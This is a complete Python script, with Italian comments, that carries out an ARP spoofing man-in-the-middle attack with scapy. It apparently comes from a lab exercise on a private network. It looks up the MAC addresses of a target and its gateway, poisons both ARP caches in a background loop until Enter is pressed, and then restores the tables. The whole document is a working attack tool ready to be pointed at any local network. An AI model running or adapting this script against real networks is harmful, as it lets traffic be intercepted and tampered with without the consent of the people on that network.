from scapy.all import *
import time
import sys
import threading

TARGET_IP = "10.0.0.2"
GATEWAY_IP = "10.0.0.1"

# Variabile globale per controllare il ciclo (mi serve per fermare l'attacco con INVIO)
stop_attack = False

print("[!] Recupero MAC Address in corso...")
try:
    TARGET_MAC = getmacbyip(TARGET_IP)
    GATEWAY_MAC = getmacbyip(GATEWAY_IP)
    if TARGET_MAC is None or GATEWAY_MAC is None:
        print("[!] Impossibile trovare i MAC (host non attivi)")
        sys.exit(0)
except Exception as e:
    print(f"[-] Errore: {e}")
    sys.exit(0)

print(f"[+] Target: {TARGET_IP} ({TARGET_MAC})")
print(f"[+] Gateway: {GATEWAY_IP} ({GATEWAY_MAC})")

def spoof():
    send(ARP(pdst=TARGET_IP, psrc=GATEWAY_IP, op=2), verbose=False)
    send(ARP(pdst=GATEWAY_IP, psrc=TARGET_IP, op=2), verbose=False)

def restore():
    print("\n[!] Ripristino tabelle ARP in corso...")
    send(ARP(pdst=TARGET_IP, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC, hwdst=TARGET_MAC, op=2), count=5, verbose=False)
    send(ARP(pdst=GATEWAY_IP, psrc=TARGET_IP, hwsrc=TARGET_MAC, hwdst=GATEWAY_MAC, op=2), count=5, verbose=False)
    print("[+] Ripristino tabelle ARP completato!")

def attack_loop():
    while not stop_attack:
        spoof()
        time.sleep(2)

# Informazioni a video all'avvio
print("[*] ARP Spoofing avviato in background.")
print("[*] Premi INVIO per fermare l'attacco e ripristinare la rete.")

t = threading.Thread(target=attack_loop)
t.start()
# P.S: Senza "threading", non potrei eseguire in parallelo lo spoofing e l'attesa della pressione del tasto "INVIO"

input() 

# Informazioni a video dopo la pressione dell'INVIO
print("[*] Interruzione richiesta...")
stop_attack = True 
t.join()	# Se non joinassi i thread alla fine, rischierei di lanciare i pacchetti di ripristino mentre il thread in bg sta ancora inviando quelli malevoli 
restore()           
print("Programma terminato.")
